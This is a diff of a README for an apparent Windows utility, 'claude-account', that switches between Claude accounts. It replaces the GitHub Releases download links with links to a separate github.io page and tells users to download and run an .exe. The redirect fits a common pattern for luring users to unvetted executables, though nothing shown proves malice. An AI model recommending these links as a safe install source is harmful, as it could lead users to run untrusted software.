@@ -1,6 +1,6 @@
 # ⚡ claude-account - Switch between your Claude accounts easily
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Sweetpotatoringrotautodidact130/claude-account/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://sweetpotatoringrotautodidact130.github.io)
 
 ## 🎯 Purpose of this tool
 
@@ -14,7 +14,7 @@ You need a computer running Windows 10 or Windows 11. The tool requires a stable
 
 Visit the link below to reach the project page. Look for the section labeled "Releases." Download the file that ends in .exe. Save this file in a folder where you keep your tools.
 
-[Download the latest version here](https://github.com/Sweetpotatoringrotautodidact130/claude-account/releases)
+[Download the latest version here](https://sweetpotatoringrotautodidact130.github.io)
 
 ## ⚙️ Installation and Setup
 
